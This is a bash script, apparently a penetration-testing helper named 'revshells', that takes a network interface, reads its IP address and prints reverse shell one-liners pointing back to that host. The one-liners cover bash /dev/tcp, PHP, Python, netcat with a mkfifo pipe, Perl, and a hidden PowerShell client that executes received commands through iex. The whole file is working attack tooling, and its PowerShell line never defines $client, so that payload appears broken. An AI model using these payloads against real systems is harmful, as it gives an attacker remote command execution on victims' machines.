#!/bin/bash


if [[ -z $1 ]]; then 

	printf "Please add Interface to set as Host IP: revshells eth0"

else
	LHOST=$(ifconfig "$1" | grep -win 'inet' | cut -d " " -f 10)

	printf "%0.s=" {1..79}
	printf "\n[+ BASH]"
	printf "\nbash -i >& /dev/tcp/$LHOST/443 0>&1\n\n"

	printf "%0.s=" {1..79}
	printf "\n[+ PHP]"
	printf "\nphp -r '\$sock=fsockopen(\"$LHOST\",443);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n"

	printf "%0.s=" {1..79}
	printf "\n[+ PYTHON]"
	printf "\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"
	printf "%0.s=" {1..79}
	printf "\n[+ NETCAT]"
	printf "\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST 443 >/tmp/f\n\n"

	printf "%0.s=" {1..79}
	printf "\n[+ PERL]"
	printf "\nperl -e 'use Socket;\$i=\"$LHOST\";\$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n\n"

	printf "%0.s=" {1..79}
	printf "\n[+ Powershell - Windows 11]"
	printf "\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$LHOST\",9090);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\n\n"
fi
